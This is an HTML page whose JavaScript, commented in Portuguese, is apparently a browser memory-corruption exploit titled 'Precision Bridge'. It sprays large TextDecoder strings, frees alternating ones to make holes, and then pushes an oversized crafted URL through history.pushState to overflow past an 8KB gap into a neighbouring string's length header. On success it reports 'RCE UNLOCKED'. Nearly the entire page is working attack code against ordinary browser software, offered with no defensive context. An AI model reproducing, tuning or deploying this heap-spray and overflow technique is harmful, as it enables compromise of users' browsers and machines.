<!DOCTYPE html>
<html>
<head>
    <title>Precision Bridge (8KB Gap)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-top: 20px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.6em; padding: 15px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>Precision Bridge: O Salto de 8KB</h1>
    <p>Atravessando o padding de 8192 bytes para acertar o vizinho.</p>

    <button onclick="startBridgeAttack()">LANÇAR PONTE (8KB)</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // CONFIGURAÇÕES MAPEADAS
        const BASE_OFFSET = 709520;     // Início do Overflow
        const BRIDGE_SIZE = 8192;       // O "Gap" que você descobriu (8KB)
        const ATTACK_SIZE = 1024 * 4;   // 4KB de ataque após a ponte (suficiente para pegar o header)

        // Vítima: 1MB TextDecoder
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startBridgeAttack() {
            log(`--- INICIANDO ATAQUE COM GAP DE ${BRIDGE_SIZE} BYTES ---`);
            
            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. SPRAY (1MB Strings)
                // Usamos a técnica TextDecoder que é a única que funcionou
                let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                rawBuffer.fill(0x42); // 'B'
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                const SPRAY_COUNT = 80;
                
                log("Alocando vítimas...");
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Abrindo buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                await forceGC();

                // 4. EXPLOIT COM PONTE
                log("Disparando...");
                setTimeout(() => {
                    try {
                        // Parte A: Enche o buffer legítimo
                        let buffer = "A".repeat(BASE_OFFSET);
                        
                        // Parte B: A Ponte (8KB de 0x01 para chegar no vizinho)
                        // Usamos 0x01 porque sabemos que passa pelo filtro
                        buffer += "\x01".repeat(BRIDGE_SIZE);
                        
                        // Parte C: O Ataque (Mais 0x01 para sobrescrever o vizinho)
                        buffer += "\x01".repeat(ATTACK_SIZE);
                        
                        history.pushState({}, "bridge_pwn", "/" + buffer);

                        checkVictims(PAYLOAD_SIZE);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkVictims(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO: Length mudou
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido na Vítima ${i}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED: 8KB GAP CONFIRMED!");
                        success = true;
                        break;
                    }
                    
                    // SINAL: Dados mudaram (mas length não)
                    if (msg.charCodeAt(0) !== 66) {
                         log(`[SINAL] Dados atingidos. O gap de 8KB pousou DENTRO dos dados.`);
                         // Se cair dentro dos dados, talvez o gap seja um pouco menor (ex: 8192 - 16 bytes header)
                         success = true; 
                         break;
                    }

                } catch(e) {}
            }
            if(!success) log("Nada atingido. O vizinho pode ter se movido.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 600));
        }
    </script>
</body>
</html>
